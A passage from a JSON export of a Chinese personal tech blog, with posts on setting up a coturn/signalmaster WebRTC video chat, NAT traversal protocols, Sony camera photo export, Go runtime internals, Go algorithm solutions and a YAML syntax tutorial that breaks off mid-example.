https://github.com/coturn/coturn/blob/master/INSTALL\n```\n\n\n\n+ 开始安装:\n\n```shell\ngit clone https://github.com/coturn/coturn\n./configure\nmake\nsudo make install\n```\n\n\n\n+ 启动:\n\n```shell\ncp examples/etc/turnserver.conf bin/turnserver.conf\nvi bin/turnserver.conf\n\n修改配置turnserver.conf，如下：\n#监听端口 \nlistening-port=3478 \n#内网IP \nlistening-ip=你的服务器内网IP\n#外网IP地址 \nexternal-ip=你的服务器外网IP\n#访问的用户、密码 \nuser=user:password\n\n\ncd bin\nturnserver -v -r 207.246.80.69:3478 -a -o  //207.246.80.69是我的服务器外网地址\n```\n\n\n\n+ 测试:\n\n打开 [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/ ](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)进行测试\n\n![image-20190129145807612](搭建webRTC视频聊天/1.png)\n\n\n\n测试时可以看log (https://github.com/coturn/coturn/wiki/README#logs)\n\n```\ntail -f /var/tmp/turn_日期.log \n```\n\n\n\n\n\n## 2. 搭建信令服务器simplemaster\n\n 信令服务器使用的是 [**signalmaster**](https://github.com/andyet/signalmaster) ，基于websocket。选用它的原因是可以直接集成turn server服务器。\n\n```shell\ngit clone https://github.com/andyet/signalmaster.git\ncd signalmaster\nnpm install express\nnpm install yetify\nnpm install getconfig\nnpm install node-uuid\nnpm install socket.io\n\n\n或者\n\ngit clone https://github.com/nguyenphu160196/signalmaster.git\ncd signalmaster\nnpm install\n```\n\n\n\nsignalmaster可以连接turnserver，但不支持用户名/密码方式，需要对源码sockets.js 110行进行调整，调整后的代码如下：\n\n```javascript\n    if (!config.turnorigins || config.turnorigins.indexOf(origin) !== -1) {\n            config.turnservers.forEach(function (server) {\n                credentials.push({\n                    username: server.username,\n                    credential: server.credential,\n                    urls: server.urls || server.url\n                });\n            });\n        }\n\n```\n\n\n\n完成后，修改config/production.json，配置turnserver的用户和密码，如下：\n\n```json\n{\n  \"isDev\": true,\n  \"server\": {\n    \"port\": 8888,\n    \"/* secure */\": \"/* whether this connects via https */\",\n    \"secure\": false,\n    \"key\": null,\n    \"cert\": null,\n    \"password\": null\n  },\n  \"rooms\": {\n    \"/* maxClients */\": \"/* maximum number of clients per room. 0 = no limit */\",\n    \"maxClients\": 0\n  },\n  \"stunservers\": [\n    {\n      \"urls\": \"stun:stun.ekiga.net:3478\"\n    }\n  ],\n  \"turnservers\": [\n    {\n      \"urls\": [\"turn:www.turn.cn:3478\"],\n      \"username\": \"user\",\n      \"credential\":\"pass\",  \n      \"expiry\": 86400\n    }\n  ]\n}\n```\n\n\n\n启动:\n\n```shell\nnohup node server.js &\n\n//Output:\n&yet -- signal master is running at: http://localhost:8888\n```\n\n\n\n## 3. 搭建Web客户端\n\n复制下面的代码，保存为一个html文件, 放在自己的服务器上\n\n```html\n\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://code.jquery.com/jquery-1.9.1.js\"></script>\n    <script src=\"http://simplewebrtc.com/latest-v3.js\"></script>\n    <script>\n \n        var webrtc = new SimpleWebRTC({\n            // the id/element dom element that will hold \"our\" video\n            localVideoEl: 'localVideo',\n            // the id/element dom element that will hold remote videos\n            remoteVideosEl: 'remoteVideos',\n            // immediately ask for camera access\n            autoRequestMedia: true,\n            url:'http://207.246.80.69:8888',\n            nick:'nickname'\n        });\n \n \n \n        // we have to wait until it's ready\n        webrtc.on('readyToCall', function () {\n            // you can name it anything\n            webrtc.joinRoom('roomid');\n \n            // Send a chat message\n            $('#send').click(function () {\n                var msg = $('#text').val();\n                webrtc.sendToAll('chat', { message: msg, nick: webrtc.config.nick });\n                $('#messages').append('<br>You:<br>' + msg + '\\n');\n                $('#text').val('');\n            });\n        });\n \n        //For Text Chat ------------------------------------------------------------------\n        // Await messages from others\n        webrtc.connection.on('message', function (data) {\n            if (data.type === 'chat') {\n                console.log('chat received', data);\n                $('#messages').append('<br>' + data.payload.nick + ':<br>' + data.payload.message+ '\\n');\n            }\n        });\n        \n    </script>\n    <style>\n        #remoteVideos video {\n            height: 150px;\n        }\n \n        #localVideo {\n            height: 150px;\n        }\n    </style>\n</head>\n<body>\n    <textarea id=\"messages\" rows=\"5\" cols=\"20\"></textarea><br />\n    <input id=\"text\" type=\"text\" />\n    <input id=\"send\" type=\"button\" value=\"send\" /><br />\n    <video id=\"localVideo\"></video>\n    <div id=\"remoteVideos\"></div>\n</body>\n</html>\n```\n\n\n\nnginx配置:\n\n```nginx\nserver {\n        listen 8080 default_server;\n        listen [::]:8080 default_server;\n\n        root /home/liuwei/web;\n        index index.html;\n}\n```\n\n+ 打开firefox开始测试  http://207.246.80.69:8080, chrome需要https\n\n+ http://simplewebrtc.com/latest-v3.js 可能丢失, 参考https://github.com/andyet/SimpleWebRTC/blob/gh-pages/latest-v3.js\n\n+ 其中url是信令服务器的地址、nickname、roomid根据需要修改\n\n  \n\n  \n\n### 4. 参考资料:\n\n+ https://www.cnblogs.com/yubaolee/p/webrtc.html\n\n+ https://blog.csdn.net/csj6346/article/details/81455663","tags":["webrtc"],"categories":["javascript"]},{"title":"nat穿透,stun,turn,ice介绍","url":"%2Fp%2Ff3e0f5f5.html","content":"\n### 1. NAT网络地址转换:  \n\n资料: https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2\n\n\n\n完全圆锥型NAT( Full Cone NAT )\n\n地址限制圆锥型NAT( Address Restricted Cone NAT )\n\n端口限制圆锥型NAT( Port Restricted Cone NAT ) \n\n对称型NAT( Symmetric NAT)\n\n<!-- more -->\n\n### 2. STUN(Session Traversal Utilities for NAT)\n\n资料: <https://zh.wikipedia.org/wiki/STUN>\n\n\n\nSTUN，NAT会话穿越应用程序 <https://tools.ietf.org/html/rfc5389>）是一种[网络协议](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)，它允许位于[NAT](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2)（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT路由器之后的主机之间创建UDP通信。该协议由RFC 5389定义。\n\n四种主要类型中有三种是可以使用的：[完全圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%AE%8C%E5%85%A8%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)、[受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)和[端口受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%8F%A3%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)——但大型公司网络中经常采用的对称型NAT（又称为双向NAT）则不能使用。\n\n\n\n### 3. TURN(Traversal Using Relay NAT)\n\n资料:  <https://zh.wikipedia.org/wiki/TURN>\n\n\n\nTURN（ <https://tools.ietf.org/html/rfc5766>），是一种数据传输协议（data-transfer protocol）。允许在TCP或UDP的连在线跨越[NAT](https://zh.wikipedia.org/wiki/NAT)或[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 4. ICE(Interactive Connectivity Establishment) \n\n资料: https://zh.wikipedia.org/wiki/%E4%BA%92%E5%8B%95%E5%BC%8F%E9%80%A3%E6%8E%A5%E5%BB%BA%E7%AB%8B>\n\n\n\nice是一种综合性的[NAT穿越](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E8%B6%8A)的技术, 是由[IETF](https://zh.wikipedia.org/wiki/IETF)的MMUSIC工作组开发出来的一种framework，可集成各种[NAT穿透](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F)技术，如[STUN](https://zh.wikipedia.org/wiki/STUN)、[TURN](https://zh.wikipedia.org/wiki/TURN)（Traversal Using Relay NAT，中继NAT实现的穿透）、RSIP（Realm Specific IP，特定域IP）等。该framework可以让SIP的客户端利用各种NAT穿透方式打穿远程的[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 5. 三个协议介绍\n\n资料:  <https://blog.csdn.net/byxdaz/article/details/52786600>  \n","tags":["nat"],"categories":["系统"]},{"title":"sony相机照片导出操作","url":"%2Fp%2Fe672b089.html","content":"\n\n\n### 1. 照片导出到手机上(方便快速使用和修改)\n\n1. sony 相机-> 第三项 -> 发送到智能手机 -> 在智能手机上选择 -> 出现了 wifi\n2. 手机连接sony 相机的 wifi\n3. 手机->Imaging Edge Mobile->连接装置->查看照片\n\n<!-- more -->\n\n### 2. 照片导出到 macbook\n\n硬盘太小放弃\n\n\n\n### 3. 照片导出到 windows\n\n1. 用数据线连接\n\n2. 出现U盘, DCIM文件夹内, 是照片, 直接剪切出来\n\n3. 视频是在PRIVATE文件夹内\n","tags":["摄影"],"categories":["摄影"]},{"title":"channel,goroutine和interface底层实现","url":"%2Fp%2F94554c31.html","content":"\n# 1. channel \n\n源码路径： https://github.com/golang/go/blob/master/src/runtime/chan.go\n\n```go\ntype hchan struct {\n\tqcount   uint           // total data in the queue\n\tdataqsiz uint           // size of the circular queue\n\tbuf      unsafe.Pointer // points to an array of dataqsiz elements\n\telemsize uint16\n\tclosed   uint32\n\telemtype *_type // element type\n\tsendx    uint   // send index\n\trecvx    uint   // receive index\n\trecvq    waitq  // list of recv waiters\n\tsendq    waitq  // list of send waiters\n\n\t// lock protects all fields in hchan, as well as several\n\t// fields in sudogs blocked on this channel.\n\t//\n\t// Do not change another G's status while holding this lock\n\t// (in particular, do not ready a G), as this can deadlock\n\t// with stack shrinking.\n\tlock mutex\n}\n```\n\n<!-- more -->\n\n### 1.1 说明\n\nbuf 指向底层循环数组，只有缓冲型的 channel 才有。\n\nsendx，recvx 均指向底层循环数组，表示当前可以发送和接收的元素位置索引值（相对于底层数组）。\n\nsendq，recvq 分别表示被阻塞的 goroutine，这些 goroutine 由于尝试读取 channel 或向 channel 发送数据而被阻塞。\n\nlock 用来保证每个读 channel 或写 channel 的操作都是原子的。\n\n底层有个 buf, 有缓冲的 channel 才有, 还有一个发送和接收的索引, 发送和接收的 goutine.\n\n### 1.2 使用\n\n```go\nch := make(chan Task, 3)\n```\n\n创建channel实际上就是在内存中实例化了一个`hchan`的结构体，并返回一个ch指针，我们使用过程中channel在函数之间的传递都是用的这个指针，这就是为什么函数传递中无需使用channel的指针，而直接用channel就行了，因为channel本身就是一个指针。\n\n+ 发送中\n\n![1](channel,goroutine和interface底层实现/1.gif)\n\n\n\n+ 发送满\n\n  当G1向buf已经满了的ch发送数据的时候，当runtine检测到对应的hchan的buf已经满了，会通知调度器，调度器会将G1的状态设置为waiting, 移除与线程M的联系，然后从P的runqueue中选择一个goroutine在线程M中执行，此时G1就是阻塞状态，但是不是操作系统的线程阻塞，所以这个时候只用消耗少量的资源。\n\n  ```go\n  type hchan struct { \n      ... \n      recvq waitq // list of recv waiters \n      sendq waitq // list of send waiters \n      ... \n  } \n  // \n  type waitq struct { \n      first *sudog \n      last *sudog \n  } \n  ```\n\n  实际上，当G1变为waiting状态后，会创建一个代表自己的sudog的结构，然后放到sendq这个list中，sudog结构中保存了channel相关的变量的指针(如果该Goroutine是sender，那么保存的是待发送数据的变量的地址，如果是receiver则为接收数据的变量的地址)\n\n  ![1](channel,goroutine和interface底层实现/2.png)\n\n+ 取出数据\n\n  当G2从ch中接收一个数据时，会通知调度器，设置G1的状态为runnable，然后将加入P的runqueue里，等待线程执行.\n\n  ![1](channel,goroutine和interface底层实现/3.png)\n\n\n\n# 2. goroutine\n\n//TODO:\n\n# 3. interface\n\n源码路径： https://github.com/golang/go/blob/master/src/runtime/runtime2.go\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\n继续看源码: https://github.com/golang/go/blob/master/src/runtime/type.go\n\n```go\n\ntype _type struct {\n\tsize       uintptr\n\tptrdata    uintptr // size of memory prefix holding all pointers\n\thash       uint32\n\ttflag      tflag\n\talign      uint8\n\tfieldAlign uint8\n\tkind       uint8\n\t// function for comparing objects of this type\n\t// (ptr to object A, ptr to object B) -> ==?\n\tequal func(unsafe.Pointer, unsafe.Pointer) bool\n\t// gcdata stores the GC type data for the garbage collector.\n\t// If the KindGCProg bit is set in kind, gcdata is a GC program.\n\t// Otherwise it is a ptrmask bitmap. See mbitmap.go for details.\n\tgcdata    *byte\n\tstr       nameOff\n\tptrToThis typeOff\n}\n```\n\n\n\n### 3.1 介绍\n\n根据 interface 是否包含有 method，底层实现上用两种 struct 来表示：iface 和 eface。`eface`表示不含 method 的 interface 结构，或者叫 empty interface。\n\n`iface` 表示 non-empty interface 的底层实现。相比于 empty interface，non-empty 要包含一些 method。method 的具体实现存放在 itab.fun 变量里。如果 interface 包含多个 method，这里只有一个 fun 变量怎么存呢？这个下面再细说。\n\n\n\n### 3.2 itab\n\n```go\ntype itab struct {\n\tinter *interfacetype\n\t_type *_type\n\thash  uint32 // copy of _type.hash. Used for type switches.\n\t_     [4]byte\n\tfun   [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.\n}\n```\n\n+ interfacetype\n\n   interfacetype 包含了一些关于 interface 本身的信息，比如 package path，包含的 method。\n\n  ```go\n  type interfacetype struct {\n      typ     _type\n      pkgpath name\n      mhdr    []imethod\n  }\n\n  type imethod struct {   //这里的 method 只是一种函数声明的抽象，比如  func Print() error\n      name nameOff\n      ityp typeOff\n  }\n  ```\n\n+ _type \n\n  _type 表示 concrete type。\n\n+ fun\n\n  fun 表示的 interface 里面的 method 的具体实现。\n\n  比如 interface type 包含了 method A, B，则通过 fun 就可以找到这两个 method 的具体实现。这里有个问题 fun 是长度为 1 的 uintptr 数组，那么怎么表示多个 method 呢？我们看一下 runtime 包的 additab 函数。\n\n  ```go\n  func additab(m *itab, locked, canfail bool) {\n      ...\n      *(*unsafe.Pointer)(add(unsafe.Pointer(&m.fun[0]), uintptr(k)*sys.PtrSize)) = ifn\n      ...\n  }\n  ```\n\n  上面的代码的意思是在 fun[0] 的地址后面依次写入其他 method 对应的函数指针。熟悉 C++ 的同学可以类比 C++ 的虚函数表指针来看。\n\n# 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/27917262\n+ https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-channel/\n+ https://www.cnblogs.com/qcrao-2018/p/11220651.html\n+ https://draveness.me/golang/docs/part2-foundation/ch04-basic/golang-interface\n+ http://legendtkl.com/2017/07/01/golang-interface-implement/\n","tags":["golang"],"categories":["golang"]},{"title":"常见算法的golang实现","url":"%2Fp%2F3850b4cc.html","content":"\n# 1. 链表\n\n### 1.1 翻转链表\n\n+ https://leetcode-cn.com/problems/reverse-linked-list/\n\n\n+ 递归版本\n\n```go\nfunc reverseList(head *ListNode) *ListNode {\n    if head == nil || head.Next == nil{\n        return head\n    }\n    p := reverseList(head.Next)\n    head.Next.Next = head \n    head.Next = nil\n    return p\n}\n```\n\n<!-- more -->\n\n+ 循环版本\n\n```go\nfunc reverseList(head *ListNode) *ListNode {\n    var prev,curr *ListNode\n    \n    curr = head\n    for curr != nil {\n        tmp := curr.Next\n        curr.Next = prev\n        prev = curr\n        curr = tmp\n    }\n    return prev\n}\n```\n\n\n\n### 1.2 链表有环和入口\n\n+ https://leetcode-cn.com/problems/linked-list-cycle/\n\n+ https://leetcode-cn.com/problems/linked-list-cycle-ii/\n\n+ hash\n\n  key 存储节点的引用, 环的入口就是第一个重复的\n\n+ 快慢指针 \n\n  头结点和相遇节点离入口点距离一样\n\n```go\nfunc hasCycle(head *ListNode) bool {\n    slow := head\n    fast := head\n    for (fast != nil && fast.Next != nil){  // 一定要判断 fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            return true\n        }\n    }\n    return false\n}\n```\n\n+ 找入口\n\n```go\nfunc detectCycle(head *ListNode) *ListNode {\n    slow := head\n    fast := head\n    cycle := false\n    for (fast != nil && fast.Next != nil){ // 一定要判断 fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            cycle = true\n            break\n        }\n    }\n    if !cycle{\n        return nil\n    }\n\n    p1 := head\n    p2 := slow // 或者 fast\n    for p1 != p2 {\n        p1 = p1.Next\n        p2 = p2.Next\n    }\n    return p1\n}\n```\n\n\n\n### 1.3 两两交换链表中的节点\n\n+ https://leetcode-cn.com/problems/swap-nodes-in-pairs/\n\n  ```go\n  func swapPairs(head *ListNode) *ListNode {\n      if head == nil || head.Next == nil{\n          return head\n      }\n  \n      //这一层3个节点, head, next, swapPairs()\n      //换成 next, head, swapPairs()\n  \n      next := head.Next\n      head.Next = swapPairs(next.Next)\n      next.Next = head\n  \n      return next\n  }\n  ```\n\n\n\n\n### 1.4 合并两个有序链表\n\n+ https://leetcode-cn.com/problems/merge-two-sorted-lists/\n\n  ```go\n  func mergeTwoLists(l1 *ListNode, l2 *ListNode) *ListNode {\n      if l1 == nil{\n          return l2\n      }\n      if l2 == nil {\n          return l1\n      }\n      \n      if l1.Val < l2.Val {\n          l1.Next = mergeTwoLists(l1.Next, l2)\n          return l1\n      }else {\n          l2.Next = mergeTwoLists(l1, l2.Next)\n          return l2\n      }\n  }\n  ```\n\n  \n\n\n\n# 2. 排序\n\n### 2.1 快速排序\n\n+ https://leetcode-cn.com/problems/sort-an-array/\n\n  ```go\n  func parition(nums []int, left, right int)  int{\n  \n      tmp := nums[left]\n  \n      for (left < right){\n          for (left < right && nums[right] >= tmp) {\n              right--\n          }\n          nums[left],nums[right] = nums[right],nums[left]\n          \n          for (left < right && nums[left] <= tmp) {\n              left++\n          }\n          nums[left],nums[right] = nums[right],nums[left]\n      }\n  \n      return left\n  }\n  \n  func quickSort(nums []int, left, right int) {\n      if left >= right{\n          return\n      }\n      mid := parition(nums, left, right)\n      quickSort(nums, left, mid-1)\n      quickSort(nums, mid+1, right)\n  }\n  \n  func sortArray(nums []int) []int {\n      quickSort(nums,0,len(nums)-1)\n      return nums\n  }\n  ```\n\n\n\n\n\n### 2.2 归并排序TODO\n\n归并排序利用了分治的思想来对序列进行排序。对一个长为 n 的待排序的序列，我们将其分解成两个长度为 n/2的子序列。每次先递归调用函数使两个子序列有序，然后我们再线性合并两个有序的子序列使整个序列有序。\n\n\n\n### 2.3 堆排序\n\n+ https://www.bilibili.com/video/BV1Eb41147dK\n\n1. 堆排序的思想就是先将待排序的序列建成大根堆，使得每个父节点的元素大于等于它的子节点。此时整个序列最大值即为堆顶元素。\n\n2. 我们将其与末尾元素交换，使末尾元素为最大值，然后再调整堆顶元素使得剩下的 n−1 个元素仍为大根堆\n3. 再重复 2 的操作我们即能得到一个有序的序列。\n\n+ 为什么不小顶堆\n\n  因为建好的小顶堆也不是排序好的\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc heapify(arr []int, i int, length int) {\n\tif i >= length {\n\t\treturn\n\t}\n\t// i和自己左孩子, 右孩子去比较, 如果大, 就交换, 保持顶部最大\n\tmax := i\n\tlChild := i*2 + 1\n\trChild := i*2 + 2\n\tif lChild <= length && arr[lChild] > arr[max] {\n\t\tmax = lChild\n\t}\n\tif rChild <= length && arr[rChild] > arr[max] {\n\t\tmax = rChild\n\t}\n\tif max != i {\n\t\t// 交换\n\t\tarr[i], arr[max] = arr[max], arr[i]\n\t\theapify(arr, max, length)\n\t}\n}\n\nfunc main() {\n\tarr := []int{3, 5, 3, 0, 8, 6, 1, 5, 8, 6, 2, 4, 9, 4, 7, 0, 1, 8, 9, 7, 3, 1, 2, 5, 9, 7, 4, 0, 2, 6}\n\tfmt.Println(arr)\n\n\t// 构建大顶堆\n\tlength := len(arr) - 1\n\tfor i := length / 2; i >= 0; i-- {\n\t\theapify(arr, i, length)\n\t}\n\tfmt.Println(arr)\n\n\t// 排序\n\tfor i := length; i >= 1; i-- {\n\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\tlength-- // 切腿\n\t\theapify(arr, 0, length)\n\t}\n\tfmt.Println(arr)\n}\n\n```\n\n\n\n# 3. 树\n\n### 3.1 二叉树最大深度\n\n+ https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/\n\n  ```go\n  func maxDepth(root *TreeNode) int {\n      if root == nil{\n          return 0\n      }\n      left := maxDepth(root.Left)\n      right := maxDepth(root.Right)\n      return max(left,right)+1\n  }\n  \n  func max(a,b int) int {\n      if a > b {\n          return a\n      }\n      return b\n  }\n  ```\n\n  \n\n### 3.2 平衡二叉树\n\n+ https://leetcode-cn.com/problems/balanced-binary-tree/\n\n```go\nfunc isBalanced(root *TreeNode) bool {\n    if root == nil{\n        return true\n    }\n    if !isBalanced(root.Left) || !isBalanced(root.Right){\n        return false\n    }\n    if abs(maxDepth(root.Left)-maxDepth(root.Right)) > 1 {\n        return false\n    }\n    return true\n}\n\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n    return max(maxDepth(root.Left),maxDepth(root.Right)) + 1\n}\n\nfunc max(a,b int) int {\n    if a > b {\n        return a\n    }\n    return b\n}\n\nfunc abs(a int) int {\n    if a < 0 {\n        return -a\n    }\n    return a \n}\n```\n\n\n\n### 3.3 二叉搜索树最近祖先\n\n+ https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/\n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n\tval := root.Val\n    pv := p.Val\n    qv := q.Val\n\n    if pv > val && qv > val {\n        return lowestCommonAncestor(root.Right, p, q)\n    }else if pv < val && qv < val {\n        return lowestCommonAncestor(root.Left, p, q)\n    }else{\n        return root\n    }\n}\n```\n\n### 3.4 二叉树最近祖先\n\n```go\n\n```\n\n\n\n\n\n# 4. 查找\n\n### 4.1 二分查找\n\n+ https://leetcode-cn.com/problems/binary-search/\n\n  ```go\n  func search(nums []int, target int) int {\n      left ,right := 0, len(nums)-1\n    \n      for left <= right {\n          mid := left + (right - left) /2\n          if target == nums[mid] {\n              return mid\n          }else if target > nums[mid]{\n              left = mid+1\n          }else{\n              right = mid-1\n          }\n      }\n      \n    \treturn -1\n  }\n  ```\n\n  \n\n# 8. 其他\n\n### 8.1 LRU\n\n+ https://leetcode-cn.com/problems/lru-cache/solution/\n\n  ```go\n  type LRUCache struct {\n      Capacity int\n      Map map[int]int\n      List []int\n  }\n  \n  \n  func Constructor(capacity int) LRUCache {\n    return LRUCache{\n          Capacity : capacity,\n          Map : make(map[int]int, 0),\n          List : make([]int, 0),\n      }\n  }\n  \n  func DelKey(a []int, key int) []int{\n      for i := 0; i < len(a); i++ {\n  \t\tif a[i] == key {\n              return append(a[:i], a[i+1:]...)\n  \t\t}\n  \t}\n  \treturn a[1:len(a)]\n  }\n  \n  func (this *LRUCache) Get(key int) int {\n      if val, ok := this.Map[key]; ok{\n          this.List = DelKey(this.List, key)\n          this.List = append(this.List, key)\n          return val\n      }\n      return -1\n  }\n  \n  \n  func (this *LRUCache) Put(key int, value int)  {\n  \n      if _, ok := this.Map[key]; ok{\n          this.Map[key] = value\n          this.List = DelKey(this.List, key)\n          this.List = append(this.List, key)\n          return \n      }\n  \n      if len(this.Map) >= this.Capacity{\n          delKey := this.List[0]      \n          this.List = DelKey(this.List, key)\n          delete(this.Map, delKey)\n      }\n  \n      this.Map[key] = value\n      this.List = append(this.List, key)\n  }\n  ```\n  \n\n\n\n### 8.2 温度\n\n+ https://leetcode-cn.com/problems/daily-temperatures/\n\n\n\n# 9. 脑力风暴\n\n### 9.1 递归\n\n+ 第一步考虑出口\n\n+ 第二步, 为了目的, 我应该完成怎么样的返回值\n\n+ 第三步, 例如考虑倒数第二层或简单理解的层, 只考虑当前层的逻辑\n\n  \n\n# 10. 其他TODO\n\n二分查找\n\n反转字符串 \n\n回文字符串\n\n最长公用子串\n\nKMP\n\n\n\n# 11. 参考资料\n\n+ https://labuladong.gitbook.io/\n+ https://lyl0724.github.io/2020/01/25/1/","tags":["算法"],"categories":["算法"]},{"title":"YAML语言教程","url":"%2Fp%2Ff2ad59fc.html","content":"\n## YAML介绍\n\nYAML 语言（发音 /ˈjæməl/ ）的设计目标，就是方便人类读写。它实质上是一种通用的数据串行化格式。它的基本语法规则如下。\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进时不允许使用Tab键，只允许使用空格。\n- 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可\n\n\n\nYAML 支持的数据结构有三种。\n\n- 对象：键值对的集合(map)\n- 数组：一组按次序排列的值(array)\n- 纯量（scalars）：单个的、不可再分的值\n\n<!-- more -->\n\n## YAML 语法\n\n1.  `#` 表示注释，从这个字符一直到行尾，都会被解析器忽略。\n\n\n\n2. `...` 和`---`配合使用，在一个配置文件中代表一个文件的结束：\n\n\n   ```\n---\ntime: 20:03:20\nplayer: Sammy Sosa\naction: strike (miss)\n...\n\n---\ntime: 20:03:47\nplayer: Sammy Sosa\naction: grand slam\n...\n   ```\n\n  相当于在一个yaml文件中连续写了两个yaml配置项。\n\n\n\n#### 对象\n\n对象的一组键值对，使用冒号结构表示。\n\n```javascript\nanimal: pets\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: 'pets' }\n```\n\nYaml 也允许另一种写法，将所有键值对写成一个行内对象。\n\n```javascript\nhash: { name: Steve, foo: bar } \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ hash: { name: 'Steve', foo: 'bar' } }\n```\n\n\n\n较为复杂的对象格式，可以使用问号加一个空格代表一个复杂的key，配合一个冒号加一个空格代表一个value：\n\n```\n?  \n    - complexkey1\n    - complexkey2\n:\n    - complexvalue1\n    - complexvalue2\n```\n\n意思即对象的属性是一个数组[complexkey1,complexkey2]，对应的值也是一个数组[complexvalue1,complexvalue2]\n\n\n\n#### 数组\n\n一组连词线开头的行，构成一个数组。\n\n```javascript\n- Cat\n- Dog\n- Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ 'Cat', 'Dog', 'Goldfish' ]\n```\n\n\n\n数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。\n\n```javascript\n-\n - Cat\n - Dog\n - Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ [ 'Cat', 'Dog', 'Goldfish' ] ]\n```\n\n数组也可以采用行内表示法。\n\n```javascript\nanimal: [Cat, Dog]\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: [ 'Cat', 'Dog' ] }\n```\n\n#### 复合结构\n\n对象和数组可以结合使用，形成复合结构。\n\n```javascript\nlanguages:\n - Ruby\n - Perl\n - Python \nwebsites:\n YAML: yaml.org \n Ruby: ruby-lang.org \n Python: python.org \n Perl: use.perl.org \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ languages: [ 'Ruby', 'Perl', 'Python' ],\n  websites: \n   { \n     YAML: 'yaml.org',\n     Ruby: 'ruby-lang.org',\n     Python: 'python.org',\n     Perl: 'use.perl.org' \n   } \n}\n```\n\n#### 纯量\n\n纯量是最基本的、不可再分的值。以下数据类型都属于 JavaScript 的纯量。\n\n- 字符串\n- 布尔值\n- 整数\n- 浮点数\n- Null\n- 时间\n- 日期\n\n数值直接以字面量的形式表示。\n\n```javascript\nnumber: 12.30\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ number: 12.30 }\n```\n\n\n\n布尔值用`true`和`false`表示。\n\n```javascript\nisSet: true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ isSet: true }\n```\n\n\n\n`null`用`~`表示。\n\n```javascript\nparent: ~ \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ parent: null }\n```\n\n\n\n时间采用 ISO8601 格式。\n\n```javascript\niso8601: 2001-12-14t21:59:43.10-05:00 \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ iso8601: new Date('2001-12-14t21:59:43.10-05:00') }\n```\n\n\n\n日期采用复合 iso8601 格式的年、月、日表示。\n\n```javascript\ndate: 1976-07-31\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ date: new Date('1976-07-31') }\n```\n\n\n\nYAML 允许使用两个感叹号，强制转换数据类型。\n\n```javascript\ne: !!str 123\nf: !!str true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ e: '123', f: 'true' }\n```\n\n\n\n#### 字符串\n\n字符串是最常见，也是最复杂的一种数据类型。字符串默认不使用引号表示。\n\n```javascript\nstr: 这是一行字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一行字符串' }\n```\n\n\n\n如果字符串之中包含空格或特殊字符，需要放在引号之中。\n\n```javascript\nstr: '内容： 字符串'\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '内容: 字符串' }\n```\n\n\n\n单引号和双引号都可以使用，`双引号不会对特殊字符转义。`\n\n```javascript\ns1: '内容\\n字符串'\ns2: \"内容\\n字符串\"\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ s1: '内容\\\\n字符串', s2: '内容\\n字符串' }\n```\n\n\n\n单引号之中如果还有单引号，必须连续使用两个单引号转义。\n\n```javascript\nstr: 'labor''s day' \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: 'labor\\'s day' }\n```\n\n\n\n字符串可以写成多行，从第二行开始，必须有一个单空格缩进。换行符会被转为空格。\n\n```javascript\nstr: 这是一段\n  多行\n  字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一段 多行 字符串' 